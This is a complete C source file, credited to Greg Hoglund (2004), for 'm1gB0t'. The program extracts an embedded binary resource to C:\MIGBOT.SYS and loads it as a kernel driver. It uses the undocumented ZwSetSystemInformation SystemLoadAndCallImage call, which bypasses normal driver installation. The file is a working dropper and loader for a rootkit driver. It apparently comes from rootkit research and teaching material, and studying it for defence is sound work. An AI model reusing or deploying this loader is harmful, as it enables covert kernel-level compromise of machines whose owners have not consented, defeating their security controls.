
//----------------------------------------------------------------
// m1gB0t, by Greg Hoglund, 2004
//----------------------------------------------------------------

//----------------------------------------------------------------
// optimizations to build smaller EXE
//----------------------------------------------------------------
#pragma comment(linker,"/ENTRY:main")
#pragma comment(linker,"/MERGE:.rdata=.data")
#pragma comment(linker,"/MERGE:.text=.data")

//adding this line makes the file a few K, but depends on
//and external MSVCRT.DLL, which is version dependant, not
//a good idea since the target machine might not have the
//right CRT on it.... (causes a nasty POPUP dialog, even)
//#pragma comment(lib,"msvcrt.lib")

//for VS.NET this is configured in the project settings, not here.
#if (_MSC_VER < 1300)
  #pragma comment(linker,"/IGNORE:4078")
  #pragma comment(linker,"/OPT:NOWIN98")
#endif

#define WIN32_LEAN_AND_MEAN

//----------------------------------------------------------------
// standard headers
//----------------------------------------------------------------
#include <windows.h> 
#include <stdio.h> 

//----------------------------------------------------------------
// stuff not found in header files
//----------------------------------------------------------------
typedef struct _UNICODE_STRING { 
    USHORT Length; 
    USHORT MaximumLength; 
#ifdef MIDL_PASS 
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; 
#else // MIDL_PASS 
    PWSTR Buffer; 
#endif // MIDL_PASS 
} UNICODE_STRING, *PUNICODE_STRING; 

typedef long NTSTATUS; 

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0) 

typedef 
NTSTATUS 
(__stdcall *ZWSETSYSTEMINFORMATION)(
            DWORD SystemInformationClass, 
			PVOID SystemInformation, 
			ULONG SystemInformationLength
);

typedef 
VOID 
(__stdcall *RTLINITUNICODESTRING)(
	PUNICODE_STRING DestinationString, 
	PCWSTR SourceString   
);

ZWSETSYSTEMINFORMATION ZwSetSystemInformation;
RTLINITUNICODESTRING RtlInitUnicodeString;

typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE 
{ 
 UNICODE_STRING ModuleName; 
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE; 

#define SystemLoadAndCallImage 38 

//----------------------------------------------------------------
// the rest of our program
//----------------------------------------------------------------
bool decompress_sysfile();
bool load_sysfile();
bool cleanup();

void main()
{
	if(!decompress_sysfile())
	{
		printf("Failed to decompress m1gB0t\r\n");
	}
	else if(!load_sysfile())
	{
		printf("Failed to load m1gB0t\r\n");
	}

	if(!cleanup())
	{
		printf("Cleanup failed\r\n");
	}
}

//----------------------------------------------------------------
// build a .sys file on disk from a resource
//----------------------------------------------------------------
bool decompress_sysfile()
{
	HRSRC aResourceH;
	HGLOBAL aResourceHGlobal;
	unsigned char * aFilePtr;
	unsigned long aFileSize;
	HANDLE file_handle;
	
	//////////////////////////////////////////////////////////
	// locate a named resource in the current binary EXE
	//////////////////////////////////////////////////////////
	aResourceH = FindResource(NULL, "MIGBOT", "BINARY");
	if(!aResourceH)
	{
		return false;
	}
	
	aResourceHGlobal = LoadResource(NULL, aResourceH);
	if(!aResourceHGlobal)
	{
		return false;
	}

	aFileSize = SizeofResource(NULL, aResourceH);
	aFilePtr = (unsigned char *)LockResource(aResourceHGlobal);
	if(!aFilePtr)
	{
		return false;
	}

	file_handle = 
		CreateFile( 
				"C:\\MIGBOT.SYS",
				FILE_ALL_ACCESS,
				0,
				NULL,
				CREATE_ALWAYS,
				0,
				NULL);

	if(INVALID_HANDLE_VALUE == file_handle)
	{
		return false;
	}

	while(aFileSize--)
	{
		unsigned long numWritten;
		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
		aFilePtr++;
	}
	CloseHandle(file_handle);

	return true;
}

//----------------------------------------------------------------
// load a sys file as a driver using undocumented method
//----------------------------------------------------------------
bool load_sysfile()
{
	SYSTEM_LOAD_AND_CALL_IMAGE GregsImage; 

	WCHAR daPath[] = L"\\??\\C:\\MIGBOT.SYS"; 

	////////////////////////////////////////////////////////////// 
	// get DLL entry points 
	////////////////////////////////////////////////////////////// 
	if(	!(RtlInitUnicodeString = (RTLINITUNICODESTRING) 
			GetProcAddress( GetModuleHandle("ntdll.dll")
			,"RtlInitUnicodeString" 
			))) 
	{
		return false;
	}

	if(!(ZwSetSystemInformation = (ZWSETSYSTEMINFORMATION)	
				GetProcAddress( 
					GetModuleHandle("ntdll.dll")
					,"ZwSetSystemInformation" )))
	{
		return false;
	}

	RtlInitUnicodeString( 
		&(GregsImage.ModuleName)
		,daPath 
	); 

	if(
		!NT_SUCCESS( 
			ZwSetSystemInformation( 
				SystemLoadAndCallImage
				,&GregsImage
				,sizeof(SYSTEM_LOAD_AND_CALL_IMAGE))))
	{ 
		return false;
	}

	return true;
}

//----------------------------------------------------------------
// clean up after ourselves
//----------------------------------------------------------------
bool cleanup()
{
	// using SLCI, you cannot delete the sys file
#ifdef _delete_sysfile
	if(S_OK != DeleteFile("C:\\MIGBOT.SYS"))
	{
		return false;
	}
#endif

	return true;
}


